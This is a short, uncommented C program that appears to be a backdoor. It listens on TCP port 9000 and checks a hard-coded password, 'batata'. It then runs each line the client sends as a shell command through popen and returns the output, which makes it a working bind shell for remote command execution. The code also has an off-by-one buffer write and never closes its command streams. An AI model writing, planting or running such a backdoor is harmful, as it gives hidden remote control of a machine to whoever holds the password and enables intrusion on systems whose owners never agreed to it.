#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("Socket creation error!");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(9000);
    serv_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("Bind failed!");
        return -1;
    }

    if (listen(sock, 5) < 0) {
        printf("Listen failed!");
        return -1;
    }

    int addrlen = sizeof(serv_addr);
    int connection = accept(sock, (struct sockaddr *)&serv_addr, (socklen_t *)&addrlen);
    if (connection < 0) {
        printf("Accept failed!");
        return -1;
    }

    char message[1024];
    char buffer[1024];
    char line[1024];

   memset(buffer, 0, sizeof(buffer));
   read(connection, buffer, 1024);
   if (strcmp(buffer, "batata\n") != 0) {
	close(connection);
	close(sock);
	return -1;
   }

    FILE *fp;
    while (1) {
        int bytes_read = read(connection, buffer, 1024);
        if (bytes_read < 0) {
            printf("Read failed!");
            break;
        }
        buffer[bytes_read] = '\0';
	fp = popen(buffer, "r");

	while (fgets (line, sizeof(line), fp) != NULL) {
	send(connection, line, strlen(line), 0);
	}
        
    }

    close(connection);
    close(sock);
    return 0;


}
